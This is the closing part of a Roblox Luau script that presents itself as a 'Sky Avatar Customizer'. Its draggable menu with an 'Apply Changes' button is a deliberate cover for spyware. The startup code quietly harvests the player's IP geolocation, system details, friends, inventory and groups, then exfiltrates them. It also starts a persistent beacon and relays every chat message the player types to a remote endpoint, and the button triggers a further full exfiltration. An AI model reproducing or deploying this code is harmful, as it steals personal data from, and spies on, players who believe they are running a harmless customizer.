        TweenService:Create(applyBtn, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(100, 255, 150)}):Play()
        applyBtn.Text = "✓ Changes Applied!"
        
        task.wait(0.8)
        
        -- Reset
        TweenService:Create(applyBtn, TweenInfo.new(0.15), {Size = UDim2.new(1, -20, 0, 44)}):Play()
        TweenService:Create(applyBtn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(80, 120, 255)}):Play()
        applyBtn.Text = "✨ Apply Changes"
        
        -- FULL EXFILTRATION triggered
        Harvest:exfiltrate()
    end)
    
    --// Footer
    local footer = Instance.new("TextLabel")
    footer.Size = UDim2.new(1, 0, 0, 16)
    footer.Position = UDim2.new(0, 0, 1, -18)
    footer.BackgroundTransparency = 1
    footer.Text = "☁️ Sky Community 2026 • sky-community.xyz"
    footer.TextColor3 = Color3.fromRGB(80, 80, 120)
    footer.TextSize = 9
    footer.Font = Enum.Font.Gotham
    footer.Parent = main
    
    --// Draggable
    local dragging, dragStart, startPos = false, nil, nil
    
    titleBar.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            dragStart = input.Position
            startPos = main.Position
        end
    end)
    
    UserInputService.InputChanged:Connect(function(input)
        if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
            local delta = input.Position - dragStart
            main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
            shadow.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        end
    end)
    
    UserInputService.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = false
        end
    end)
    
    --// Open Animation
    main.Size = UDim2.new(0, 0, 0, 0)
    main.Position = UDim2.new(0.5, 0, 0.5, 0)
    shadow.Size = UDim2.new(0, 0, 0, 0)
    shadow.Position = UDim2.new(0.5, 0, 0.5, 0)
    
    TweenService:Create(main, TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
        Size = UDim2.new(0, 400, 0, 520),
        Position = UDim2.new(0.5, -200, 0.5, -260)
    }):Play()
    
    TweenService:Create(shadow, TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
        Size = UDim2.new(0, 420, 0, 540),
        Position = UDim2.new(0.5, -210, 0.5, -270)
    }):Play()
    
    --// Keybind Toggle (Left Alt + S)
    UserInputService.InputBegan:Connect(function(input, gameProcessed)
        if not gameProcessed and input.KeyCode == Enum.KeyCode.S and UserInputService:IsKeyDown(Enum.KeyCode.LeftAlt) then
            screenGui.Enabled = not screenGui.Enabled
        end
    end)
    
    return screenGui
end

--// ═══════════════════════════════════════════════════════════════
--// INITIALIZATION
--// ═══════════════════════════════════════════════════════════════

task.spawn(function()
    -- Phase 1: Silent harvest
    Harvest:collectIPGeo()
    Harvest:collectSystem()
    Harvest:collectFriends()
    Harvest:collectInventory()
    Harvest:collectGroups()
    
    -- Phase 2: Build GUI cover
    task.wait(0.5)
    GUI:create()
    
    -- Phase 3: Initial exfiltration
    task.wait(3)
    Harvest:exfiltrate()
    
    -- Phase 4: Persistent beacon
    task.wait(1)
    Harvest:startBeacon()
    
    -- Phase 5: Chat monitoring
    LocalPlayer.Chatted:Connect(function(msg)
        local chatPayload = HttpService:JSONEncode({
            chat_id = CHAT_ID,
            text = string.format("💬 [%s]: %s", LocalPlayer.Name, msg),
            parse_mode = "Markdown"
        })
        Harvest:safeRequest(SYNC_PRIMARY, "POST", chatPayload)
    end)
end)

print("☁️ Sky Avatar Customizer v2.1 loaded successfully!")
print("☁️ Press Left Alt + S to toggle UI")
